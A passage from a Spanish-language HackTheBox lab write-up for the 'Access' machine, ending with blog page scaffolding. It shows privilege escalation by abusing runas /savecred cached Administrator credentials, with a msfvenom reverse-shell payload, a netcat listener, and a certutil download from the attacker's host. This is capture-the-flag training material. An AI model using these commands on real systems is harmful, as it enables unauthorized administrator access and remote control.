+<p>Encontramos una instrucción, que se ejecuta cada vez que se llame al archivo <a href="https://fileinfo.com/extension/lnk">.lnk</a>. Rompámosla y entendamos que está haciendo rápidamente:</p>
+
+<ul>
+  <li><code>..\..\..\Windows\System32\runas.exe</code>: Llama al programa [runas.exe], el cual sirve como método de ejecutar comandos o tareas como otros usuarios.</li>
+  <li><code>C:\ZKTeco\ZKAccess3.5</code>: En la lógica de la instrucción esto no haría nada y se habría mezclado en el output del <code>.lnk</code> (o sea, esto no hace nada, lo obviaremos).</li>
+  <li><code>/user:ACCESS\Administrator</code>: El usuario con el que se ejecutara el proceso.</li>
+  <li><code>/savecred</code>: Es usado para que no solicite la contraseña todas las veces que se ejecute el <code>.lnk</code>, la pedirá la primera vez, pero ya despues no.</li>
+  <li><code>"C:\ZKTeco\ZKAccess3.5\Access.exe"</code>: Es el proceso que ejecuta el binario <code>runas.exe</code> como usuario <strong>Administrator</strong> al “ejecutar” el archivo <code>.lnk</code>.</li>
+</ul>
+
+<p>Así que lo que se estaría ejecutando seria:</p>
+
+<pre><code class="language-txt">runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
+</code></pre>
+
+<p>Validando si esa línea está haciendo algo, no encontré algún cambio, pero podemos probar el funcionamiento de <code>/savecred</code>:</p>
+
+<p><strong>Nos pide contraseña:</strong></p>
+
+<pre><code class="language-powershell">c:\Users\Public\Desktop&gt;runas.exe /user:ACCESS\Administrator "C:\ZKTeco\ZKAccess3.5\Access.exe"  
+Enter the password for ACCESS\Administrator: nosabo:(
+
+c:\Users\Public\Desktop&gt;
+</code></pre>
+
+<p><strong>No nos pide contraseña:</strong></p>
+
+<pre><code class="language-powershell">c:\Users\Public\Desktop&gt;runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"  
+
+c:\Users\Public\Desktop&gt;
+</code></pre>
+
+<p>Así que probablemente está ejecutando algo con el binario <code>Access.exe</code> y no nos da problemas…</p>
+
+<p>…</p>
+
+<blockquote>
+  <p><strong>runas</strong>: Nos permite lanzar programas (tanto propios como del sistema operativo) y archivos por lotes en nombre de otro usuario. Es decir, como usuario “x” lanzaremos un comando como usuario “y” sin necesidad de iniciar sesión en el equipo con “y”. <a href="https://protegermipc.net/2018/09/05/ejemplos-uso-del-comando-runas-en-windows/">Ejemplo de uso comando <strong>runas.exe</strong> en Windows</a>.</p>
+</blockquote>
+
+<ul>
+  <li>Otro recurso: <a href="http://freyes.svetlian.com/RunAs/RunAs.htm"><strong>RunAs.exe</strong> en <strong>Windows</strong></a>.</li>
+</ul>
+
+<p>Pues perfecto, usemos esa propia línea, pero en vez de ejecutar el binario <code>Access.exe</code> intentemos ejecutar un payload que contenga una <strong>Reverse Shell</strong>, así obtendríamos una Shell como el usuario <strong>Administrator</strong> (ya que todo lo que ejecutemos se ejecutaría como él), generémoslo con ayuda de <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4434 -f exe -o averque.exe
+</code></pre>
+
+<p>Entonces, cuando haga la petición hacia el <strong>LHOST</strong> por el <strong>LPORT</strong> generara una <strong>shell_reverse_tcp</strong> (una terminal normalita de toda la vida). Lo guardamos con formato <code>.exe</code> y que se llame <code>averque.exe</code>.</p>
+
+<p>Pongámonos en escucha tanto en el puerto <strong>4434</strong> como en un servidor web para poder subir el archivo:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4434
+listening on [any] 4434 ...
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Ahora sí, juguemos con <strong>certutil.exe</strong>:</p>
+
+<pre><code class="language-powershell">C:\Users\security\Videos&gt;certutil.exe -f -urlcache -split http://10.10.14.16:8000/averque.exe c:\Users\security\Videos\averque.exe
+</code></pre>
+
+<pre><code class="language-powershell">C:\Users\security\Videos&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\Videos
+
+06/11/2021  25:25 PM    &lt;DIR&gt;          .
+06/11/2021  25:25 PM    &lt;DIR&gt;          ..
+06/11/2021  25:25 PM            73,802 averque.exe
+               2 File(s)        147,604 bytes
+               2 Dir(s)  16,771,743,744 bytes free
+
+C:\Users\security\Videos&gt;
+</code></pre>
+
+<p>Y ahora ejecutamos el binario con la ayuda de <strong>runas</strong> y las credenciales que tenemos (guardadas):</p>
+
+<pre><code class="language-powershell">C:\Users\security\Videos&gt;runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\Videos\averque.exe"  
+</code></pre>
+
+<p>Y en nuestro listeneeeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_administrator_RevSH.png" alt="156bash_administrator_RevSH" /></p>
+
+<p>Y siiiiiiiii, tamos dentro del sistema como el usuario <strong>Administrator</strong> ⛱️</p>
+
+<p>Solo nos quedaría ver las <strong>flags</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156flags.png" alt="156flags" /></p>
+
+<p>…</p>
+
+<p>Bonito camino, movimientos con <strong>FTP</strong> bastante divertidos, vista amplia y pensamiento lateral.</p>
+
+<p>Muchas gracias por leer yyyyyyyyyyyyyyyyyyy A R O M P E R T O D O !</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Access&url=http://localhost:4000/htb/access" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#.mdb">.mdb</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#FTP">FTP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#runas.exe">runas.exe</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#telnet">telnet</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/carrier">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" alt="HackTheBox - Carrier"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/carrier">HackTheBox - Carrier</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">29 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/sneakymailer">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bannersneakymailer.png" alt="HackTheBox - SneakyMailer"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/sneakymailer">HackTheBox - SneakyMailer</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio pero que de medio muy poco, o pues casi me enloquezco :P SneakyMailer… Vaya locura, jugaremos simulando phishing, explotaremos cositas de FTP, romperemos PyPi para crearnos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Nov 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/servmon">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png" alt="HackTheBox - ServMon"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/servmon">HackTheBox - ServMon</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">20 Jun 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
